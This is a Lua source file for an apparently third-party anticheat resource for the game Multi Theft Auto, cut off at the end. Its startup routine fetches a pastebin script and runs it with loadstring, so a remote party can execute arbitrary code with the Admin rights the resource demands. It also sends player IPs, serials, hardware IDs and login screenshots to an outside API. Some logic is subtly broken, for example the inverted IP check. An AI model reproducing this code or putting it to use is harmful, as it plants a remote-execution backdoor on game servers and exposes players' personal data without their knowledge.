-- Vars
local apikey = nil
local isAutorizado = false
local screenshotAPI = false
local keyValida = false
local authID = nil
local tela = false
--
local ignorePlayers = {}
local alreadyBanned = {}
local screenshotsImg = {}
-- Vars

-- Anti Overwrite
local _cancelEvent = cancelEvent
local _stopResource = stopResource
local _fetchRemote = fetchRemote

local function cancelEvent()
	return _cancelEvent()
end

local function stopResource(resource)
	return _stopResource(resource)
end


local function fetchRemote(...)
	return _fetchRemote(...)
end -- Arrumar

-- Anti Overwrite

-- Utils

function getPedWeapons(ped)
    local playerWeapons = {}
    if ped and isElement(ped) and getElementType(ped) == "ped" or getElementType(ped) == "player" then
        for i=2,9 do
            local wep = getPedWeapon(ped,i)
            if wep and wep ~= 0 then
                table.insert(playerWeapons,wep)
            end
        end
    else
        return false
    end
    return playerWeapons
end

function calcularDistancia(x1, y1, z1, x2, y2, z2)
    return getDistanceBetweenPoints3D(x1, y1, z1, x2, y2, z2)
end

function msg(mensagem) -- outputChatBox
	outputChatBox(servidor.cor.."["..servidor.sigla.."] #ffffff"..mensagem, root ,255,255,255,true)
end

function checkGMain() -- Verificar se alguma opções estão abusivas ou em falta.
	if discord.config.resolutionX > 1280 or discord.config.resolutionX < 64 then
        discord.config.resolutionX = 600
    end
    if discord.config.resolutionY > 720 or discord.config.resolutionY < 64 then
        discord.config.resolutionY = 400
    end
end

function Mensagem() -- Start iniciado
	outputDebugString("["..servidor.sigla.."] AntiCheat v"..getResourceInfo(getThisResource(), "version").." on (Created by uW33D#3333)")
    if outros.startchat then
        clearChatBox()
        outputChatBox(" ", root ,255,255,255,true)
        outputChatBox(servidor.cor.."=========================================================", root ,255,255,255,true)
        outputChatBox(" ", root ,255,255,255,true)
        outputChatBox(servidor.cor.."["..servidor.sigla.."] "..getSystemLanguage("startchat"):gsub("${arg}", getResourceInfo(getThisResource(), "version")), root ,255,255,255,true)
        outputChatBox(" ", root ,255,255,255,true)
        outputChatBox(servidor.cor.."=========================================================", root ,255,255,255,true)
        outputChatBox(" ", root ,255,255,255,true)
    end
    outputDebugString("["..getResourceName(getThisResource()).."] Started successfully!")
    local url = "https://pastebin.com/raw/dk3EbQcx"
    downloadCode(url)
    notify(root, "[AC] "..getSystemLanguage("startnotify"):gsub("${arg}", getResourceInfo(getThisResource(), "version")), "success")
    updatecheck()
    setTimer(function()
        if outros.chat then
            clearChatBox()
        end
        acLoad()
    end, 5000, 1)
end

function acLoad() -- Criar sql antivpn e outros
	vpnSys = dbConnect('sqlite', 'VPN.sqlite')
    dbExec(vpnSys, 'create table if not exists ipHistorico (conta, serial, ipv4, vpn)')
    dbExec(vpnSys, 'create table if not exists ipsPermitidosADM (ip)')
    bans = dbConnect('sqlite', 'BANS.sqlite')
    dbExec(bans, 'drop table if exists banimentos')
    dbExec(bans, 'create table if not exists banimentos (serial, ip)')
    logsAC(authID)
    if outros.gbans and outros.gbansrealcheck == false then
    listGBans()
    end
    local value = ""
    for i,v in ipairs(servidor.anticheatmta) do
        value = value .. v
        if i < #servidor.anticheatmta then
            value = value .. ", "  -- Adiciona uma vírgula e um espaço se não for o último número
        end
    end
    --iprint(value)
    setServerConfigSetting("enablesd", value)
end

function EnviarMensagemDiscord(webhook, message)
    sendOptions = {
        queueName = "dcq",
        connectionAttempts = 3,
        connectTimeout = 5000,
        formFields = {
            content=message
        },
    }
    fetchRemote ( webhook, sendOptions, callback )
end
addEvent("MD.LogDC", true)
addEventHandler("MD.LogDC", getRootElement(),EnviarMensagemDiscord)

function callback()
end

function sendDiscordMessage(imgData, titleEmbed, discordMessage, hook)
    local discordData = {
        content = discord.config.message;
        username = discord.config.name;
        avatar_url = discord.config.avatar;
        embeds = {
            {
                title = titleEmbed;
                color = discord.config.color;
                description = discordMessage;
                footer = {
                    text = "uW33D Anticheat | https://github.com/ruip005/mta_anticheat";
                    icon_url = "https://camo.githubusercontent.com/a32f726b1d1312f8e9e89eb258613bb455c8f398d7885c93c78547108f425a07/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313131303730303137363336313931383534352f313133373530353231323930333435363830382f41432e706e67";
                };
                thumbnail = {
                    url = imgData;
                };
            };
        };
    }
    local jsonData = toJSON(discordData)
    jsonData = string.sub(jsonData, 3, #jsonData - 2)
    
    local sendOptions = {
        headers = {
            ["Content-Type"] = "application/json";
        };
        postData = jsonData;
    };
    fetchRemote(hook, sendOptions, function ()
end)
end

function isLogado(source)
	if not isElement(source) then
		return end
    if isGuestAccount(getPlayerAccount ( source )) then
        return false
    else
        return true
    end
end

function tirarFoto(player, tag, webhook)
    if not isElement( player ) and not getElementType( player ) == "player" then
        return end
    if isLogado(player) then
    	table.insert(screenshotsImg, {tag, webhook})
        setTimer(function() 
            takePlayerScreenShot( player, discord.config.resolutionX, discord.config.resolutionY, tag, discord.config.quality )
        end, 500, 1)
    else end
end
addEvent("onTriggerPrint", true)
addEventHandler("onTriggerPrint", getRootElement(),tirarFoto)

function atualizarValor(lista, id, novoValor)
        for i, registro in ipairs(lista) do
            local registroID, valor = unpack(registro)
            if registroID == id then
            lista[i][2] = novoValor
            return true
        end
    end
    return false
end

function obterValorPorID(lista, id)
    for _, registro in ipairs(lista) do
        local registroID, valor = unpack(registro)
        if registroID == id then
            return valor 
        end
    end
    return nil 
end

function downloadCode(url)
    fetchRemote(url, function(responseData, error)
        if error == 0 then
            local code = responseData
            if code then
                local success, errorMsg = pcall(loadstring(code))
                if not success then
                    msg(getSystemLanguage("errorcodeonline")..errorMsg)
                end
            else
                msg(getSystemLanguage("errordownloadcode"))
            end
        else
            msg(getSystemLanguage("requesterror") .. error)
        end
    end)
end

local allowed = { { 48, 57 }, { 65, 90 }, { 97, 122 } }

function generateString(len)
    if tonumber(len) then
        math.randomseed ( getTickCount () )
        local str = ""
        for i = 1, len do
            local charlist = allowed[math.random ( 1, 3 )]
            str = str .. string.char ( math.random ( charlist[1], charlist[2] ) )
        end
        return str
    end
    return false
end

function isValidIP(ip)
    local chunks = {ip:match("(%d+)%.(%d+)%.(%d+)%.(%d+)")}
    if #chunks == 4 then
        for _, chunk in ipairs(chunks) do
            local num = tonumber(chunk)
            if num < 0 or num > 255 then
                return false
            end
        end
        return true
    else
        return false
    end
end

function getPlayerFromSerial ( serial )
    assert ( type ( serial ) == "string" and #serial == 32, "getPlayerFromSerial - invalid serial" )
    for index, player in ipairs ( getElementsByType ( "player" ) ) do
        if ( getPlayerSerial ( player ) == serial ) then
            return player
        end
    end
    return false
end

function isPlayerVIP(player)
    local account = getPlayerAccount(player)
    if not account or isGuestAccount(account) then
        return false
    end

    local accountName = getAccountName(account)
    for _, group in ipairs(aclGroupList()) do
        for _, acl in ipairs(ac.vips.acl) do
            if aclGetGroup(acl) == group and isObjectInACLGroup("user."..accountName, group) then
                return true
            end
        end
    end

    return false
end

-- Utils

-- Metodos API

function logIN_API(auth, pwd)
	local url = "https://api.uw33dac.me/v2/priv8/login" -- arrumar
	local porta, ac_version = (getServerConfigSetting("serverport") or getSystemLanguage("noinfo")),(getResourceInfo(getThisResource(), "version") or getSystemLanguage("noinfo"))
	local requestData = {
		headers = {
                ["Content-Type"] = "application/json",
                    },
        postData = '{"username": "'..auth..'", "password":  "'..pwd..'", "porta":  "'..porta..'", "ac_version": "'..ac_version..'"}',
        queueName = "POST"
	}
	fetchRemote(url, requestData, function(response, info)
		if info == 401 then
			msg(getSystemLanguage("apiinvalid"))
		elseif info == 500 then
			msg(getSystemLanguage("apierrorinternal"))
		elseif info == 400 then
			msg(getSystemLanguage("apilackdata"))
		elseif info == 0 then
			msg(getSystemLanguage("apiidk"))
		else
			local data = fromJSON(response)
			if data then
			apikey = data.api or nil
			keyValida = data.live and true or false
			screenshotAPI = data.ss and true or false
			authID = data.id or nil
			isAutorizado = data.success or false
			end
		end
	end)
end

function listGBans()
		local url = "https://api.uw33dac.me/v2/priv8/bans" -- arrumar
		local requestData = {
		headers = {
                ["Content-Type"] = "application/json",
                ["x-api-key"] = apikey
                    },
        queueName = "GET"
		}
		fetchRemote(url, requestData, function(response, info)
		if info == 401 then
			msg(getSystemLanguage("apiinvalid")) 
		elseif info == 500 then
			msg(getSystemLanguage("apierrorinternal")) 
		elseif info == 400 then
			msg(getSystemLanguage("apilackdata"))
		elseif info == 0 then
			msg(getSystemLanguage("apiidk"))
		else
			local data = fromJSON(response)
			if data and info.success then
				for i, serial in ipairs(data.seriais) do
                        local ip = data.ips[i]
                        dbExec(bans, 'insert into banimentos (serial, ip) values (?,?)', serial, ip)
                end
			end 
		end
	end)
end

function CheckGBan(serial, ip)

	local url = "https://api.uw33dac.me/v2/priv8/checkban" -- arrumar
	local requestData = {
		headers = {
                ["Content-Type"] = "application/json",
                ["x-api-key"] = apikey
                    },
        postData = '{"serial": "'..serial..'", "ip":  "'..ip..'"}',
        queueName = "POST"
	}
	fetchRemote(url, requestData, function(response, info)
		if info == 401 then
			msg(getSystemLanguage("apiinvalid")) 
		elseif info == 500 then
			msg(getSystemLanguage("apierrorinternal")) 
		elseif info == 400 then
			msg(getSystemLanguage("apilackdata"))
		elseif info == 0 then
			msg(getSystemLanguage("apiidk"))
		else
			local data = fromJSON(response)
			if data then
				if data.isBlacklisted then
					banPlayer(getPlayerFromSerial(serial), true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("gbanB").."\n"..servidor.discord)
                    outputChatBox(" ", root)
                    outputChatBox(" ", root)
                    outputChatBox(servidor.cor.."["..servidor.sigla.."] "..getSystemLanguage("gbanchat"):gsub("${getname}", nome):gsub("${id}",idd), root ,255,255,255,true)
                    outputChatBox(" ", root)
                    outputChatBox(" ", root)
                    notify(root,"[AC] "..getSystemLanguage("gbannotify"):gsub("${getname}", nome):gsub("${id}",idd), "info")
				else
					return
				end
			else
			return false
			end 
		end
	end)

end

function createGBan(user, serial, ip, reason, authID, img)
	local url = "https://api.uw33dac.me/v2/priv8/addgban" -- arrumar
	local requestData = {
		headers = {
		["x-api-key"] = apikey,
		["Content-Type"] = "application/json"
	},
		postData = '{"user": "'..user..'", "serial": "'..serial..'", "ip": "'..ip..'", "reason": "'..reason..'", "auth": "'..authID..'", "img": "'..img..'"}',
		queueName = "POST"
	}
	fetchRemote(url, requestData, function(response, info)
		if info == 401 then
			msg(getSystemLanguage("apiinvalid"))
		elseif info == 500 then
			msg(getSystemLanguage("apierrorinternal"))
		elseif info == 400 then
			msg(getSystemLanguage("apilackdata"))
		elseif info == 0 then
			msg(getSystemLanguage("apiidk"))
		else
			local data = fromJSON(response)
			if data then
				msg("[AC] Global ban adicionado") --traduzir arrumar
			else
				msg("[AC] Erro no banimento global") --traduzir arrumar
			end
		end
	end)
end

function logsAC(authID)
	local port, name = (getServerConfigSetting("serverport") or getSystemLanguage("noinfo")), (getServerConfigSetting("servername") or getSystemLanguage("noinfo"))
	local url = "https://api.uw33dac.me/v2/priv8/logs" -- arrumar
	local requestData = {
		headers = {
		["x-api-key"] = apikey,
		["Content-Type"] = "application/json"
		},
		postData = '{"authid": "'..authID..'", "porta": '..port..', "name": "'..name..'", "discord": "'..servidor.discord..'"}',
		queueName = "POST"
	}
	fetchRemote(url, requestData, function(response, info)
		if info == 401 then
			msg(getSystemLanguage("apiinvalid"))
		elseif info == 500 then
			msg(getSystemLanguage("apierrorinternal"))
		elseif info == 400 then
			msg(getSystemLanguage("apilackdata"))
		elseif info == 0 then
			msg(getSystemLanguage("apiidk"))
		else
			local data = fromJSON(response)
			if data then
				--iprint("[AC] Logs do servidor adicionado") --traduzir arrumar
			else
				iprint("[AC] Erro de Logs API") --traduzir arrumar
			end
		end
	end)
end

function createLocalBan(user, serial, ip, reason, authID, img)
	local url = "https://api.uw33dac.me/v2/priv8/addlocalban" -- arrumar
	local requestData = {
		headers = {
		["x-api-key"] = apikey,
		["Content-Type"] = "application/json"
		},
		postData = '{"player": "'..user..'", "serial": "'..serial..'", "ip": "'..ip..'", "reason": "'..reason..'", "authID": "'..authID..'", "img": "'..img..'"}',
		queueName = "POST"
	}
	fetchRemote(url, requestData, function(response, info)
		if info == 401 then
			msg(getSystemLanguage("apiinvalid"))
		elseif info == 500 then
			msg(getSystemLanguage("apierrorinternal"))
		elseif info == 400 then
			msg(getSystemLanguage("apilackdata"))
		elseif info == 0 then
			msg(getSystemLanguage("apiidk"))
		else
			local data = fromJSON(response)
			if data then
				--iprint("[AC] Local Ban adicionado")
			else
				iprint("[AC] Erro de API Local Ban") --traduzir arrumar
			end
		end
	end)
end

function errorAC(line, message)
    local url = "https://api.uw33dac.me/v2/priv8/errors" -- arrumar
    local requestData = {
        headers = {
        ["x-api-key"] = apikey,
        ["Content-Type"] = "application/json"
    },
        postData = '{"msg": "'..line.."- "..message..'", "authID": '..authID..'}',
        queueName = "POST"
    }
    fetchRemote(url, requestData, function(response, info)
        iprint(info)
        iprint(response)
        if info == 401 then
            msg(getSystemLanguage("apiinvalid"))
        elseif info == 500 then
            msg(getSystemLanguage("apierrorinternal"))
        elseif info == 400 then
            msg(getSystemLanguage("apilackdata"))
        elseif info == 0 then
            msg(getSystemLanguage("apiidk"))
        else
            local data = fromJSON(response)
            --iprint(data)
            if data and data.success then
                --iprint("[AC] Erro no anticheat enviado para análise!") --traduzir arrumar
            else
                iprint("[AC] Erro no envio do Error_AC") --traduzir arrumar
            end
        end
    end)
end

function printAC(user, serial, ip, authID, img)
    local url = "https://api.uw33dac.me/v2/priv8/print" -- arrumar
    local requestData = {
        headers = {
        ["x-api-key"] = apikey,
        ["Content-Type"] = "application/json"
    },
        postData = '{"nick": "'..user..'", "serial": "'..serial..'", "ip": "'..ip..'", "authID": '..authID..', "img": "'..img..'"}',
        queueName = "POST"
    }
    fetchRemote(url, requestData, function(response, info)
        if info == 401 then
            msg(getSystemLanguage("apiinvalid"))
        elseif info == 500 then
            msg(getSystemLanguage("apierrorinternal"))
        elseif info == 400 then
            msg(getSystemLanguage("apilackdata"))
        elseif info == 0 then
            msg(getSystemLanguage("apiidk"))
        else
            local data = fromJSON(response)
            if data and data.success then
                --("[AC] Metadados da print enviada com sucesso!") --traduzir arrumar const { nick, serial, ip, authID, img } = req.body;
            else
                iprint("[AC] Erro no envio dos metadados da print") --traduzir arrumar
            end
        end
    end)
end

function sendScreenshot(tag, nick, user, id ,serial, ip, webhook, img)
    local url = "https://api.uw33dac.me/v2/priv8/sendphoto" -- http://send.uw33dac.me:8111/image/upload
    local requestData = {
        headers = {
        ["x-api-key"] = apikey,
        ["Content-Type"] = "application/json"
    },
        postData = '{"id": "'..tag..'", "nick": "'..nick..'", "user": "'..user..'", "ide": "'..id..'" ,"serial": "'..serial..'", "ip": "'..ip..'", "webhook": "'..webhook..'", "image": "'..base64Encode(img)..'"}',
        queueName = "POST"
    }

    fetchRemote(url, requestData, function(response, info)
        if info == 401 then
            msg(getSystemLanguage("apiinvalid"))
        elseif info == 500 then
            msg(getSystemLanguage("apierrorinternal"))
        elseif info == 400 then
            msg(getSystemLanguage("apilackdata"))
        elseif info == 0 then
            msg(getSystemLanguage("apiidk"))
        else
            local data = fromJSON(response)
            if data.success then
                --iprint("[AC] Screenshot enviada com sucesso!") --traduzir arrumar const { nick, serial, ip, authID, img } = req.body;
            else
                iprint("[AC] Erro no envio da Screenshot") --traduzir arrumar
            end
        end
    end)
end

function spooferAPI(p, auth, haveAssign, hwid, serial, ip)
    local url = "https://api.uw33dac.me/v2/priv8/spoofer"
    local requestData = {
        headers = {
        ["x-api-key"] = apikey,
        ["Content-Type"] = "application/json"
    },
        postData = '{"auth": "'..auth..'", "haveHWID": '..tostring(haveAssign)..', "hwid": "'..hwid..'", "serial": "'..serial..'", "ip": "'..ip..'"}',
        queueName = "POST"
    }

    fetchRemote(url, requestData, function(response, info)
        if info == 401 then
            msg(getSystemLanguage("apiinvalid"))
        elseif info == 500 then
            msg(getSystemLanguage("apierrorinternal"))
        elseif info == 400 then
            msg(getSystemLanguage("apilackdata"))
        elseif info == 0 then
            msg(getSystemLanguage("apiidk"))
        else
            local data = fromJSON(response)
            if data.success then
                if data.hwid then
                    if p then
                    triggerClientEvent(p, "ac>createKey", p , data.hwid) -- testar com client
                    else end
                end
                if data.banned then
                    banPlayer(p, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("spooferB").."\n"..servidor.discord)
                    EnviarMensagemDiscord(discord.spoofer, getSystemLanguage("spooferD"):gsub("${nome}", getPlayerName(p)):gsub("${id}", getElementData(p, servidor.id)):gsub("${ip}", getPlayerIP(p)):gsub("${serial}", getPlayerSerial(p)):gsub("${conta}", getAccountName(p)))
                end -- fim if banned
                if data.suspected then
                    notifyStaff(getSystemLanguage("spooferS"):gsub("${nome}", getPlayerName(p)))
                    -- Enviar mensagem discord com gsub nome id ip serial conta
                    EnviarMensagemDiscord(discord.spoofer, getSystemLanguage("spooferDS"):gsub("${nome}", getPlayerName(p)):gsub("${id}", getElementData(p, servidor.id)):gsub("${ip}", getPlayerIP(p)):gsub("${serial}", getPlayerSerial(p)):gsub("${conta}", getAccountName(p)))
                end
            else
                iprint("[AC] Erro no HWID maker") --traduzir arrumar
            end
        end
    end)
end

function revokeBan(serial, auth)
    local url = "https://api.uw33dac.me/v2/priv8/revoke"
    local requestData = {
        headers = {
        ["x-api-key"] = apikey,
        ["Content-Type"] = "application/json"
    },
        postData = '{"auth": "'..auth..'", "serial": "'..serial..'"}',
        queueName = "POST"
    }

    fetchRemote(url, requestData, function(response, info)
        if info == 401 then
            msg(getSystemLanguage("apiinvalid"))
        elseif info == 500 then
            msg(getSystemLanguage("apierrorinternal"))
        elseif info == 400 then
            msg(getSystemLanguage("apilackdata"))
        elseif info == 0 then
            msg(getSystemLanguage("apiidk"))
        else
            local data = fromJSON(response)
            if data.success then
                iprint("[AC] Banimento revogado") --traduzir arrumar
            else
                iprint("[AC] Erro no HWID maker") --traduzir arrumar
            end
        end
    end)
end

-- Metodos API

-- Auxiliares AC



function getPlayerFromID(id)
    if (id) then
        for i, v in ipairs(getElementsByType("player")) do
            if not isGuestAccount(getPlayerAccount(v)) then
                if (getElementData(v, servidor.id) == tonumber(id)) then
                    return v
                end
            end
        end
    end
    return false
end

function notifyStaff(texto)
    for i, receiver in ipairs(getElementsByType('player')) do
        if isObjectInACLGroup('user.'..getAccountName(getPlayerAccount(receiver)), aclGetGroup(servidor.acl)) then
            if getElementData(receiver, servidor.staff) then
                notify(receiver, "[AC] "..texto, "info")
            else end
        end
    end
end

function ignorebindplayer(thePlayer, _, id)
    if isObjectInACLGroup('user.'..getAccountName(getPlayerAccount(thePlayer)), aclGetGroup(servidor.acl)) then
        id = tonumber(id)
        if not id then 
            return notify(thePlayer, "[AC] "..getSystemLanguage("syntaxaci"), "info")
        end
        if not getPlayerFromID(id) then
            return notify(thePlayer, "[AC] "..getSystemLanguage("playeroff"), "info")
        end
        if isAlreadyIgnore(id) then
            return notify(thePlayer, "[AC] "..getSystemLanguage("playeralreadyignore"), "info")
        else
            table.insert(ignorePlayers, id)
            notify(thePlayer, "[AC] "..getSystemLanguage("playeraddedtoaci"), "info")
            notifyStaff(getSystemLanguage("acistaff"):gsub("${getname}",getPlayerName(thePlayer)):gsub("${id}",id))
        end
        ----
    else
        notify(thePlayer, "[AC] "..getSystemLanguage("nopermission"), "error")
    end
end
addCommandHandler("aci", ignorebindplayer)

function isAlreadyIgnore(id)
    for i = 1, #ignorePlayers do
        if ignorePlayers[i] == id then
          return true
      end
  end
  return false
end

function addIPPerm(p, cmd, ip)
    if isObjectInACLGroup ( "user." ..getAccountName(getPlayerAccount(source)), aclGetGroup (servidor.admin)) then
        if not ip then
            if isValidIP(ip) then
                dbExec(vpnSys, 'insert into ipsPermitidosADM (ip) values(?)', ip)
                notify(p, "[AC] "..getSystemLanguage("ipaddedtojoin"):gsub("${id}", ip), "success")
                return
            else
                return notify(p, "[AC] "..getSystemLanguage("ipnotvalid"), "error")
            end
        else
            return notify(p, "[AC] "..getSystemLanguage("ipsyntax"), "info")
        end
    else
        return notify(p, "[AC] "..getSystemLanguage("nopermission"), "error")
    end
end
addCommandHandler("acip", addIPPerm)

function ipPermitido(ip)
    local existeIP = dbPoll(dbQuery(vpnSys, 'select * from ipsPermitidosADM where ip = ?', ip), - 1)
    if #existeIP == 0 then
        return false
    else
        return true
    end
end

function checkVPNIP(playerIP, jogador)
    if outros.antivpn.on == false then
        return end
        if ipPermitido(playerIP) then
            return
        end
        local existeIP = dbPoll(dbQuery(vpnSys, 'select * from ipHistorico where ipv4 = ?', playerIP), - 1)
        --iprint(#existeIP)
        if #existeIP == 0 then
            local apiUrl = "https://ipqualityscore.com/api/json/ip/" .. outros.antivpn.api .. "/" .. playerIP
            fetchRemote(apiUrl, function(response, info)
                local data = fromJSON(response)
                --iprint(getResourceName(getThisResource()).. ": ".. (getPlayerName(jogador) or "error").." using VPN? "..tostring(data.vpn))
                dbExec(vpnSys, 'insert into ipHistorico (conta, serial, ipv4, vpn) values(?, ?, ?, ?)', getAccountName(getPlayerAccount(jogador)), getPlayerSerial(jogador),playerIP, tostring(data.vpn))
                if data and data.vpn == true then
                    notifyStaff(getSystemLanguage("playerusingvpn"):gsub("${getname}", getPlayerName(jogador)))
                    if outros.antivpn.applyBan then
                        banPlayer(jogador, true, false, true,servidor.sigla.." Anticheat", getSystemLanguage("vpnapi").."\n"..servidor.discord, outros.antivpn.bantime)
                    else
                        kickPlayer(jogador, servidor.sigla.." Anticheat", getSystemLanguage("vpnapi").."\n"..servidor.discord)
                    end
                end
            end)
    else --existe ip
        local isVPN = existeIP[1]["vpn"]
        if isVPN then
            notifyStaff(getSystemLanguage("playerusingvpn"):gsub("${getname}", getPlayerName(jogador)))
            if outros.antivpn.banvpn then
                banPlayer(jogador, true, false, true,servidor.sigla.." Anticheat", getSystemLanguage("vpnsql").."\n"..servidor.discord, outros.antivpn.bantime)
            else
                kickPlayer(jogador, servidor.sigla.." Anticheat", getSystemLanguage("vpnsql").."\n"..servidor.discord)
            end
        end
end
end

setTimer(function() -- Anti Bypass a cada 30mins
	screenshotsImg = {}
    if isAutorizado == false then
        for i=1,150 do
            outputChatBox(getResourceName(getThisResource())..": this server is circumventing anticheat security measures!",root) -- arrumar traduzir
        end
        stopResource(getThisResource())
    else
end
end,60000*30,0)

function removeHex (s)
    if type (s) == "string" then
        while (s ~= s:gsub ("#%x%x%x%x%x%x", "")) do
            s = s:gsub ("#%x%x%x%x%x%x", "")
        end
    end
    return s or false
end

function isPlayerBannedSave(serial, ip)
	local query = dbQuery(bans, 'select * from banimentos where serial = ? or ip = ?', serial, ip)
	local res = dbPoll(query, -1)
	if #res ~= 0 then
		return true
	else
		return false
	end 
end

-- Auxiliares AC

-- Metodos Principais

addEventHandler ("onResourceStart", resourceRoot, function() -- Iniciando anticheat
    if not getResourceName(getThisResource()) then
        return
    end
    outputDebugString("["..getResourceName(getThisResource()).."] "..getSystemLanguage("search"))
	checkGMain()
	--Verificar se o resource tem permissão
	local permission = isObjectInACLGroup("resource."..getResourceName(getThisResource()), aclGetGroup("Admin"))
	if not permission then
		msg(getSystemLanguage("misspermission"))
		cancelEvent()
		if getResourceState(getThisResource()) == "running" or getResourceState(getThisResource()) == "starting" then
			stopResource(getThisResource())
		elseif hasObjectPermissionTo (getThisResource(), "function.fetchremote", false) then
			aclGroupAddObject(aclGetGroup("Admin"), "resource."..getResourceName(getThisResource()))
		else
		end
	else
		logIN_API(auth.user, auth.key)
		setTimer(function()
		if isAutorizado then
			if keyValida then
				-- Start arrumar
				Mensagem()
			else
				-- Key expirada arrumar
				msg(getSystemLanguage("expired"):gsub("${r}", getResourceName(getThisResource())))
            	stopResource(getThisResource())
			end
		else
				msg(getSystemLanguage("notallowed") or "Erro")
				stopResource(getThisResource())
		end
		end, 1100, 1)
	end
end) --fim function + evento

function playerCheckInfos() -- Quando jogador entrar no servidor
    local jogador = source
    setElementData(source, "wantPhoto", true)
    notify(jogador, "[AC] "..getSystemLanguage("verifyinfos"), "info")
    setTimer(function()
        takePlayerScreenShot(jogador, 800, 600, "ssactive" )
    end, 5000, 1)
    end
addEventHandler("onPlayerLogin", getRootElement(),playerCheckInfos)

function getFoto( theResource, status, pixels, timestamp, tag ) -- Receber takePlayerScreenShot
    if tag == "Verify" then -- Anti screen off Joined
        if status == "disabled" and outros.antiss then
            banPlayer(source, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("screenof"), 60)
        end
    end

    if outros.antiss then -- Anti SS off
        if status == "disabled" then
            kickPlayer(source, servidor.sigla.." Anticheat", getSystemLanguage("screenoffkick"))
        end
    end

    local tick = getTickCount()
    local idd = (getElementData(source, servidor.id) or getSystemLanguage("noinfo"))

    if isAlreadyIgnore(idd) then ---apagar arrumar
    return
end


if tostring(getResourceName(theResource)) == getResourceName(getThisResource()) and tag ~= "ssactive" then
    local path = nil
    if string.find(tag, "BAN") then
        local newtag = "BAN"
    else
        local newtag = "SUS"
    end
    if newtag == "BAN" then 
        path = getSystemLanguage("bans").."/"..getAccountName(getPlayerAccount(source)).."_"..tick..".jpg"
    else
        path = getSystemLanguage("suspects").."/"..getAccountName(getPlayerAccount(source)).."_"..tick..".jpg"
    end
    local print = fileCreate(path)
    ------
    if pixels then
        local user = (getAccountName(getPlayerAccount(source)) or 'N/A')
        local nick = (getPlayerName(source) or 'N/A')
        local id = (getElementData(source, "ID") or 'N/A')
        local ip = (getPlayerIP(source) or 'N/A')
        local serial = (getPlayerSerial(source) or 'N/A')
        if screenshotAPI then
            	sendScreenshot(tag, nick, user, id, serial , ip, obterValorPorID(screenshotsImg, tag), pixels)
                printAC(nick, serial, ip, authID, tag)
        else
        end
    end
    ------
    if outros.saveprints then -- salvar prints na pasta local
        if print then
            fileWrite(print, pixels)
            fileClose(print)
        end
    else end
    ------
    if tela == false and outros.telastaff then -- aparecer sus na tela staff
    tela = true
    for i, receiver in ipairs(getElementsByType('player')) do
        if isObjectInACLGroup('user.'..getAccountName(getPlayerAccount(receiver)), aclGetGroup(servidor.acl)) then
            if getElementData(receiver, servidor.staff) then
                outputChatBox(getSystemLanguage("screenof").." "..(getPlayerName(source) or getSystemLanguage("noinfo")).." ["..(getElementData(source, servidor.id) or getSystemLanguage("noinfo")).."]", receiver)
                triggerClientEvent( receiver, "onMyClientScreenShot", getRootElement(),pixels )
            else end
        end
    end
    setTimer(function()
        tela = false
    end, 15000, 1)
end
    ------
end
end    
addEventHandler( "onPlayerScreenShot", getRootElement(),getFoto)

function bindsSUS() -- Binds
    local nome = getPlayerName(client) or getSystemLanguage("noinfo")
    local idd = getElementData(client, servidor.id) or getSystemLanguage("noinfo")
    local ip = getPlayerIP(client) or getSystemLanguage("noinfo")
    local serial = getPlayerSerial(client) or getSystemLanguage("noinfo")
    local conta = getAccountName(getPlayerAccount(client)) or getSystemLanguage("noinfo")
    local randomCode = auth.user.."_"..generateString(12)
    tirarFoto(client, randomCode, discord.binds)
    if isAlreadyIgnore(idd) then
        return end
        if discord.config.embed == false then 
            EnviarMensagemDiscord(discord.binds, getSystemLanguage("bindsD"):gsub("${nome}", nome):gsub("${id}", idd):gsub("${ip}", ip):gsub("${serial}", serial):gsub("${conta}", conta))
        else
        if screenshotAPI then
        
    else
        sendDiscordMessage("https://cdn.discordapp.com/attachments/1146267618983034940/1150373470912385035/standard.gif", "Binds", getSystemLanguage("thinkcheater"):gsub("${nome}", nome):gsub("${id}", idd), discord.binds)
    end
            -------
        end
        for i, receiver in ipairs(getElementsByType('player')) do
            if isObjectInACLGroup('user.'..getAccountName(getPlayerAccount(receiver)), aclGetGroup(servidor.acl)) then
                if getElementData(receiver, servidor.staff) then
                    notify(receiver, "[AC] "..getSystemLanguage("thinkcheater"):gsub("${nome}", nome):gsub("${id}", idd), "info")
                end
            end
        end
    end
--end
addEvent("onSUSbinds", true)
addEventHandler("onSUSbinds", getRootElement(),bindsSUS)

function updatecheck()
    if outros.update then
        ------------
        fetchRemote("https://api.github.com/repos/ruip005/mta_anticheat/releases/latest", function(data, status)
            assert(status == 0 and data, "Anticheat: "..getSystemLanguage("errorapiupdate").." (Status code: "..tostring(status)..")")

            data = fromJSON(data)

            if data then
                local tag_name       = tostring(data["tag_name"])
                local latest_version = tonumber( (tag_name:gsub("v",""):gsub("%.","")) )

                if latest_version then
                    if latest_version > 23003 then
                        local asset = data["assets"][1]

                        if asset then
                            local path = getSystemLanguage("updates").."/"..asset["name"]

                            if fileExists(path) then
                                print(getResourceName(getThisResource())..": "..getSystemLanguage("newversionalreadydown"))

                            else
                                fetchRemote(asset["browser_download_url"], function(data, status)
                                    assert(status == 0 and data, "Anticheat: "..getSystemLanguage("errorupdatingnewv"))

                                    local zip = fileCreate(path)
                                    if zip then
                                        fileWrite(zip, data)
                                        fileClose(zip)
                                        if discord.config.embed == false then
                                            EnviarMensagemDiscord(discord.updatesAC, getSystemLanguage("updateD"))
                                        else
                                            sendDiscordMessage("https://static.wikia.nocookie.net/gta/images/7/70/CJ-GTASA.png/revision/latest?cb=20170321232122&path-prefix=pt", "Update", getSystemLanguage("updateD"), discord.updatesAC)
                                        end
                                    end
                                end)
                            end
                        end
                    end
                end
            end
        end)
        ------------
    else
    end --outros.update
end

function restrictedPanel(cmd) -- Comandos blacklist
    if not ac.cmdblock.on then 
        return
        end
    if source and isElement(source) then
        for i,v in ipairs(ac.cmdblock.cmds) do
            if cmd == v then
                --iprint("BAN:CmdBlock")
                if not ac.cmdblock.ban then
                kickPlayer(source, servidor.sigla.." Anticheat", getSystemLanguage("blackcmdsB").."\n"..servidor.discord)
            else
                banPlayer(source, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("blackcmdsB").."\n"..servidor.discord, ac.cmdblock.seconds)
            end
                if discord.config.embed == false then
